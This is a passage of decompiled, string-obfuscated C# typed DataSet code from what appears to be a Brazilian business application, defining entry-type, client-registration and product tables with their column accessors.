			public event TB_TIPOLANCAMENTORowChangeEventHandler TB_TIPOLANCAMENTORowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_TIPOLANCAMENTORowChangeEventHandler TB_TIPOLANCAMENTORowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_TIPOLANCAMENTORowChangeEventHandler TB_TIPOLANCAMENTORowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_TIPOLANCAMENTODataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1546);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_TIPOLANCAMENTODataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_TIPOLANCAMENTODataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_TIPOLANCAMENTORow(TB_TIPOLANCAMENTORow row)
			{
				base.Rows.Add(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_TIPOLANCAMENTORow AddTB_TIPOLANCAMENTORow(string Descrição)
			{
				TB_TIPOLANCAMENTORow tB_TIPOLANCAMENTORow = (TB_TIPOLANCAMENTORow)NewRow();
				object[] itemArray = new object[1] { Descrição };
				tB_TIPOLANCAMENTORow.ItemArray = itemArray;
				base.Rows.Add(tB_TIPOLANCAMENTORow);
				return tB_TIPOLANCAMENTORow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_TIPOLANCAMENTODataTable tB_TIPOLANCAMENTODataTable = (TB_TIPOLANCAMENTODataTable)base.Clone();
				tB_TIPOLANCAMENTODataTable.InitVars();
				return tB_TIPOLANCAMENTODataTable;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataTable CreateInstance()
			{
				return new TB_TIPOLANCAMENTODataTable();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal void InitVars()
			{
				columnDescrição = base.Columns[\u0004.\u0001.\u0001(4874)];
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			private void InitClass()
			{
				columnDescrição = new DataColumn(\u0004.\u0001.\u0001(4874), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDescrição);
				columnDescrição.MaxLength = 50;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_TIPOLANCAMENTORow NewTB_TIPOLANCAMENTORow()
			{
				return (TB_TIPOLANCAMENTORow)NewRow();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_TIPOLANCAMENTORow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_TIPOLANCAMENTORow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_TIPOLANCAMENTORow(TB_TIPOLANCAMENTORow row)
			{
				base.Rows.Remove(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(4896)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		public class TB_CADCLIRow : DataRow
		{
			private TB_CADCLIDataTable tableTB_CADCLI;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_CADCLI.CódigoColumn]);
				}
				set
				{
					base[tableTB_CADCLI.CódigoColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string NOME_CLI
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.NOME_CLIColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(4952), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.NOME_CLIColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string APELIDO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.APELIDOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5076), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.APELIDOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string ENDERECO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.ENDERECOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5198), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.ENDERECOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string CIDADE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.CIDADEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5322), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.CIDADEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string UF
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.UFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5442), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.UFColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CEP
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.CEPColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5554), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.CEPColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string TEL_CEL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.TEL_CELColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5668), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.TEL_CELColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string TEL_RES
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.TEL_RESColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5790), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.TEL_RESColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string COMPLEMENTO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.COMPLEMENTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(5912), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.COMPLEMENTOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string DAT_NASC
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.DAT_NASCColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6042), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.DAT_NASCColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string DAT_CAD
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.DAT_CADColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6166), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.DAT_CADColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string EMAIL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.EMAILColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6288), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.EMAILColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string FACEBOOK
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.FACEBOOKColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6406), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.FACEBOOKColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CONTATO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.CONTATOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6530), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.CONTATOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string CNPJ
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.CNPJColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6652), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.CNPJColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string INS
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.INSColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6768), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.INSColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CPF
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.CPFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6882), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.CPFColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string RG
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.RGColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(6996), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.RGColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7108), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string BAIRRO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.BAIRROColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7236), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.BAIRROColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string FILIACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADCLI.FILIACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7356), ex);
					}
				}
				set
				{
					base[tableTB_CADCLI.FILIACAOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CADCLIRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_CADCLI = (TB_CADCLIDataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOME_CLINull()
			{
				return IsNull(tableTB_CADCLI.NOME_CLIColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOME_CLINull()
			{
				base[tableTB_CADCLI.NOME_CLIColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsAPELIDONull()
			{
				return IsNull(tableTB_CADCLI.APELIDOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetAPELIDONull()
			{
				base[tableTB_CADCLI.APELIDOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsENDERECONull()
			{
				return IsNull(tableTB_CADCLI.ENDERECOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetENDERECONull()
			{
				base[tableTB_CADCLI.ENDERECOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCIDADENull()
			{
				return IsNull(tableTB_CADCLI.CIDADEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCIDADENull()
			{
				base[tableTB_CADCLI.CIDADEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsUFNull()
			{
				return IsNull(tableTB_CADCLI.UFColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetUFNull()
			{
				base[tableTB_CADCLI.UFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCEPNull()
			{
				return IsNull(tableTB_CADCLI.CEPColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCEPNull()
			{
				base[tableTB_CADCLI.CEPColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_CELNull()
			{
				return IsNull(tableTB_CADCLI.TEL_CELColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_CELNull()
			{
				base[tableTB_CADCLI.TEL_CELColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTEL_RESNull()
			{
				return IsNull(tableTB_CADCLI.TEL_RESColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetTEL_RESNull()
			{
				base[tableTB_CADCLI.TEL_RESColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCOMPLEMENTONull()
			{
				return IsNull(tableTB_CADCLI.COMPLEMENTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCOMPLEMENTONull()
			{
				base[tableTB_CADCLI.COMPLEMENTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_NASCNull()
			{
				return IsNull(tableTB_CADCLI.DAT_NASCColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDAT_NASCNull()
			{
				base[tableTB_CADCLI.DAT_NASCColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_CADNull()
			{
				return IsNull(tableTB_CADCLI.DAT_CADColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDAT_CADNull()
			{
				base[tableTB_CADCLI.DAT_CADColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsEMAILNull()
			{
				return IsNull(tableTB_CADCLI.EMAILColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetEMAILNull()
			{
				base[tableTB_CADCLI.EMAILColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsFACEBOOKNull()
			{
				return IsNull(tableTB_CADCLI.FACEBOOKColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFACEBOOKNull()
			{
				base[tableTB_CADCLI.FACEBOOKColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCONTATONull()
			{
				return IsNull(tableTB_CADCLI.CONTATOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCONTATONull()
			{
				base[tableTB_CADCLI.CONTATOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCNPJNull()
			{
				return IsNull(tableTB_CADCLI.CNPJColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCNPJNull()
			{
				base[tableTB_CADCLI.CNPJColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsINSNull()
			{
				return IsNull(tableTB_CADCLI.INSColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetINSNull()
			{
				base[tableTB_CADCLI.INSColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCPFNull()
			{
				return IsNull(tableTB_CADCLI.CPFColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCPFNull()
			{
				base[tableTB_CADCLI.CPFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsRGNull()
			{
				return IsNull(tableTB_CADCLI.RGColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetRGNull()
			{
				base[tableTB_CADCLI.RGColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_CADCLI.OBSERVACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetOBSERVACAONull()
			{
				base[tableTB_CADCLI.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsBAIRRONull()
			{
				return IsNull(tableTB_CADCLI.BAIRROColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetBAIRRONull()
			{
				base[tableTB_CADCLI.BAIRROColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsFILIACAONull()
			{
				return IsNull(tableTB_CADCLI.FILIACAOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetFILIACAONull()
			{
				base[tableTB_CADCLI.FILIACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_CADPRODRow : DataRow
		{
			private TB_CADPRODDataTable tableTB_CADPROD;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_CADPROD.CódigoColumn]);
				}
				set
				{
					base[tableTB_CADPROD.CódigoColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string DESCRICAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.DESCRICAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7480), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.DESCRICAOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string COD_BARRAS
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_CADPROD.COD_BARRASColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(7608), ex);
					}
				}
				set
				{
					base[tableTB_CADPROD.COD_BARRASColumn] = value;
				}
			}

